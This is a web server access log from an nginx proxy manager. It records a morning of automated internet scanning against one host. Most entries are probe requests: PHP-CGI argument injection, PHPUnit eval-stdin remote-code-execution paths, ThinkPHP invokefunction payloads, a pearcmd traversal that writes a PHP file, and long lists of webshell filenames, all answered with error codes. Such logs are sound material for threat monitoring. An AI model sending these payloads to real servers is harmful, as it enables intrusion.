[21/Apr/2026:06:54:35 +0000] 404 - GET http 212.33.46.41 "/v2/_catalog" [Client 46.101.166.128] [Length 150] [Gzip -] "Go-http-client/1.1" "-"
[21/Apr/2026:06:54:35 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 164.92.143.197] [Length 154] [Gzip -] "-" "-"
[21/Apr/2026:06:54:35 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 164.92.143.197] [Length 154] [Gzip -] "-" "-"
[21/Apr/2026:06:54:35 +0000] 200 - GET http 212.33.46.41 "/" [Client 164.92.143.197] [Length 568] [Gzip 1.86] "Go-http-client/1.1" "-"
[21/Apr/2026:06:54:35 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 164.92.143.197] [Length 154] [Gzip -] "-" "-"
[21/Apr/2026:06:54:38 +0000] 404 - GET http 212.33.46.41 "/solr/admin/cores?action=STATUS&wt=json" [Client 209.38.201.239] [Length 150] [Gzip -] "Go-http-client/1.1" "-"
[21/Apr/2026:07:04:23 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 165.227.153.177] [Length 154] [Gzip -] "-" "-"
[21/Apr/2026:07:09:49 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 45.135.194.20] [Length 154] [Gzip -] "-" "-"
[21/Apr/2026:07:13:54 +0000] 400 - GET http 212.33.46.41 "/favicon.ico" [Client 127.0.0.1] [Length 230] [Gzip -] "-" "-"
[21/Apr/2026:07:55:53 +0000] 200 - GET http 212.33.46.41 "/" [Client 193.176.31.154] [Length 1033] [Gzip -] "Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)" "-"
[21/Apr/2026:08:10:24 +0000] 400 - GET http 212.33.46.41 "/" [Client 185.242.226.16] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
[21/Apr/2026:08:33:29 +0000] 400 - GET http 212.33.46.41 "/" [Client 18.97.26.60] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/56.0.3103.104 Safari/537.32" "-"
[21/Apr/2026:08:50:03 +0000] 400 - POST http localhost-nginx-proxy-manager "-" [Client 156.226.181.188] [Length 154] [Gzip -] "-" "-"
[21/Apr/2026:08:50:42 +0000] 400 - POST http localhost-nginx-proxy-manager "-" [Client 156.226.181.188] [Length 154] [Gzip -] "-" "-"
[21/Apr/2026:08:50:42 +0000] 404 - POST http 212.33.46.41 "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:50:42 +0000] 405 - POST http 212.33.46.41 "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" [Client 156.226.181.188] [Length 154] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:09 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:10 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:13 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:13 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:14 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/phpunit/LICENSE/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:15 +0000] 404 - GET http 212.33.46.41 "/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:16 +0000] 404 - GET http 212.33.46.41 "/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:16 +0000] 404 - GET http 212.33.46.41 "/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:16 +0000] 404 - GET http 212.33.46.41 "/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:17 +0000] 404 - GET http 212.33.46.41 "/phpunit/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:21 +0000] 404 - GET http 212.33.46.41 "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:23 +0000] 404 - GET http 212.33.46.41 "/lib/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:24 +0000] 404 - GET http 212.33.46.41 "/lib/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:25 +0000] 404 - GET http 212.33.46.41 "/lib/phpunit/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:25 +0000] 404 - GET http 212.33.46.41 "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:26 +0000] 404 - GET http 212.33.46.41 "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:26 +0000] 404 - GET http 212.33.46.41 "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:28 +0000] 404 - GET http 212.33.46.41 "/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:28 +0000] 404 - GET http 212.33.46.41 "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:28 +0000] 404 - GET http 212.33.46.41 "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:29 +0000] 404 - GET http 212.33.46.41 "/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:30 +0000] 404 - GET http 212.33.46.41 "/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:33 +0000] 404 - GET http 212.33.46.41 "/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:34 +0000] 404 - GET http 212.33.46.41 "/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:35 +0000] 404 - GET http 212.33.46.41 "/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:35 +0000] 404 - GET http 212.33.46.41 "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:37 +0000] 404 - GET http 212.33.46.41 "/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:37 +0000] 404 - GET http 212.33.46.41 "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:38 +0000] 404 - GET http 212.33.46.41 "/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:40 +0000] 404 - GET http 212.33.46.41 "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:42 +0000] 404 - GET http 212.33.46.41 "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:43 +0000] 404 - GET http 212.33.46.41 "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:45 +0000] 404 - GET http 212.33.46.41 "/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:47 +0000] 404 - GET http 212.33.46.41 "/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:49 +0000] 404 - GET http 212.33.46.41 "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:49 +0000] 200 - GET http 212.33.46.41 "/" [Client 45.148.10.67] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" "-"
[21/Apr/2026:08:51:49 +0000] 404 - GET http 212.33.46.41 "/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:51:51 +0000] 404 - GET http 212.33.46.41 "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:52:26 +0000] 404 - GET http 212.33.46.41 "/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:52:28 +0000] 404 - GET http 212.33.46.41 "/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:52:28 +0000] 403 - GET http 212.33.46.41 "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:52:33 +0000] 403 - GET http 212.33.46.41 "/index.php?lang=../../../../../../../../tmp/index1" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:08:52:34 +0000] 404 - GET http 212.33.46.41 "/containers/json" [Client 156.226.181.188] [Length 150] [Gzip -] "libredtail-http" "-"
[21/Apr/2026:09:01:16 +0000] 404 - GET http cm46-41.liwest.at "/wp-content/plugins/hellopress/wp_filemanager.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:17 +0000] 404 - GET http cm46-41.liwest.at "/rip" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:17 +0000] 404 - GET http cm46-41.liwest.at "/archive.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:17 +0000] 404 - GET http cm46-41.liwest.at "/term.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:17 +0000] 404 - GET http cm46-41.liwest.at "/0x.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:18 +0000] 404 - GET http cm46-41.liwest.at "/3.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:18 +0000] 404 - GET http cm46-41.liwest.at "/wp-admin/maint/index.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:18 +0000] 404 - GET http cm46-41.liwest.at "/sql.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:18 +0000] 404 - GET http cm46-41.liwest.at "/style.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:18 +0000] 404 - GET http cm46-41.liwest.at "/admin.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:18 +0000] 404 - GET http cm46-41.liwest.at "/inputs.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:19 +0000] 404 - GET http cm46-41.liwest.at "/file.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:19 +0000] 404 - GET http cm46-41.liwest.at "/ms-edit.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:19 +0000] 404 - GET http cm46-41.liwest.at "/simple.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:19 +0000] 404 - GET http cm46-41.liwest.at "/bgymj.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:19 +0000] 404 - GET http cm46-41.liwest.at "/wp-content/plugins/twenty/login.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:20 +0000] 404 - GET http cm46-41.liwest.at "/404.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:20 +0000] 404 - GET http cm46-41.liwest.at "/file3.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:20 +0000] 404 - GET http cm46-41.liwest.at "/wp-mail.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:20 +0000] 404 - GET http cm46-41.liwest.at "/about.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:20 +0000] 404 - GET http cm46-41.liwest.at "/wp.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:20 +0000] 404 - GET http cm46-41.liwest.at "/.dj/index.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:21 +0000] 404 - GET http cm46-41.liwest.at "/adminfuns.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:21 +0000] 404 - GET http cm46-41.liwest.at "/php8.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:21 +0000] 404 - GET http cm46-41.liwest.at "/classwithtostring.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:21 +0000] 404 - GET http cm46-41.liwest.at "/info.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:21 +0000] 404 - GET http cm46-41.liwest.at "/ioxi-o.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:21 +0000] 404 - GET http cm46-41.liwest.at "/011i.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:22 +0000] 404 - GET http cm46-41.liwest.at "/edit.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:22 +0000] 404 - GET http cm46-41.liwest.at "/sid3.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:22 +0000] 404 - GET http cm46-41.liwest.at "/load.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:22 +0000] 404 - GET http cm46-41.liwest.at "/166.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:22 +0000] 404 - GET http cm46-41.liwest.at "/leaf.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:22 +0000] 404 - GET http cm46-41.liwest.at "/grsiuk.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:23 +0000] 404 - GET http cm46-41.liwest.at "/8.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:23 +0000] 404 - GET http cm46-41.liwest.at "/fs.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:23 +0000] 404 - GET http cm46-41.liwest.at "/ws38.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:23 +0000] 404 - GET http cm46-41.liwest.at "/a7.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:23 +0000] 404 - GET http cm46-41.liwest.at "/classsmtps.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:23 +0000] 404 - GET http cm46-41.liwest.at "/amax.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:24 +0000] 404 - GET http cm46-41.liwest.at "/CDX1.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:24 +0000] 404 - GET http cm46-41.liwest.at "/rip.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:24 +0000] 404 - GET http cm46-41.liwest.at "/1.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:24 +0000] 404 - GET http cm46-41.liwest.at "/chosen.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:24 +0000] 404 - GET http cm46-41.liwest.at "/css.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:24 +0000] 404 - GET http cm46-41.liwest.at "/php.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:24 +0000] 404 - GET http cm46-41.liwest.at "/wp-Blogs.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:25 +0000] 404 - GET http cm46-41.liwest.at "/wp-content/index.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:25 +0000] 404 - GET http cm46-41.liwest.at "/wp-content/plugins/beteng88/ws83.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:25 +0000] 404 - GET http cm46-41.liwest.at "/ws83.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:25 +0000] 404 - GET http cm46-41.liwest.at "/file61.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:25 +0000] 404 - GET http cm46-41.liwest.at "/sadcut1.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:25 +0000] 404 - GET http cm46-41.liwest.at "/y.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:26 +0000] 404 - GET http cm46-41.liwest.at "/666.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:26 +0000] 404 - GET http cm46-41.liwest.at "/7.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:26 +0000] 404 - GET http cm46-41.liwest.at "/wp-config-sample.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:26 +0000] 404 - GET http cm46-41.liwest.at "/log.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:26 +0000] 404 - GET http cm46-41.liwest.at "/a5.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:26 +0000] 404 - GET http cm46-41.liwest.at "/aa.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:27 +0000] 404 - GET http cm46-41.liwest.at "/bolt.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:27 +0000] 404 - GET http cm46-41.liwest.at "/x.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:27 +0000] 404 - GET http cm46-41.liwest.at "/jga.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:27 +0000] 404 - GET http cm46-41.liwest.at "/k.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:28 +0000] 404 - GET http cm46-41.liwest.at "/vx.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:28 +0000] 404 - GET http cm46-41.liwest.at "/ws77.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:28 +0000] 404 - GET http cm46-41.liwest.at "/2.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:28 +0000] 404 - GET http cm46-41.liwest.at "/abcd.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:28 +0000] 404 - GET http cm46-41.liwest.at "/wp-content/plugins/admin.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:28 +0000] 404 - GET http cm46-41.liwest.at "/asd.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:29 +0000] 404 - GET http cm46-41.liwest.at "/default.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:29 +0000] 404 - GET http cm46-41.liwest.at "/gettest.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:29 +0000] 404 - GET http cm46-41.liwest.at "/install.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:29 +0000] 404 - GET http cm46-41.liwest.at "/tfm.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:29 +0000] 404 - GET http cm46-41.liwest.at "/ws81.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:29 +0000] 404 - GET http cm46-41.liwest.at "/222.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:30 +0000] 404 - GET http cm46-41.liwest.at "/t.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:30 +0000] 404 - GET http cm46-41.liwest.at "/wp-admin/maint/index.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:30 +0000] 404 - GET http cm46-41.liwest.at "/6xBAm3vODE05BSzkJZRAws.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:30 +0000] 404 - GET http cm46-41.liwest.at "/a.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:30 +0000] 404 - GET http cm46-41.liwest.at "/a1.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:30 +0000] 404 - GET http cm46-41.liwest.at "/onclickfuns.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:31 +0000] 404 - GET http cm46-41.liwest.at "/w.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:31 +0000] 404 - GET http cm46-41.liwest.at "/wp-admin/maint/about.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:31 +0000] 404 - GET http cm46-41.liwest.at "/wp-content/plugins/index.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:31 +0000] 404 - GET http cm46-41.liwest.at "/wp-good.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:31 +0000] 404 - GET http cm46-41.liwest.at "/.info.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:31 +0000] 404 - GET http cm46-41.liwest.at "/config.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:32 +0000] 404 - GET http cm46-41.liwest.at "/item.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:32 +0000] 404 - GET http cm46-41.liwest.at "/albin.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:32 +0000] 404 - GET http cm46-41.liwest.at "/alfa.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:32 +0000] 404 - GET http cm46-41.liwest.at "/autoload_classmap.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:32 +0000] 404 - GET http cm46-41.liwest.at "/av.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:33 +0000] 404 - GET http cm46-41.liwest.at "/dragonshell.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:33 +0000] 404 - GET http cm46-41.liwest.at "/f35.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:33 +0000] 404 - GET http cm46-41.liwest.at "/gg.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:33 +0000] 404 - GET http cm46-41.liwest.at "/gifclass.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:33 +0000] 404 - GET http cm46-41.liwest.at "/sql.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:33 +0000] 404 - GET http cm46-41.liwest.at "/up.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
[21/Apr/2026:09:01:33 +0000] 404 - GET http cm46-41.liwest.at "/wp-admin/css/colors/blue/index.php" [Client 172.202.75.66] [Length 150] [Gzip -] "-" "-"
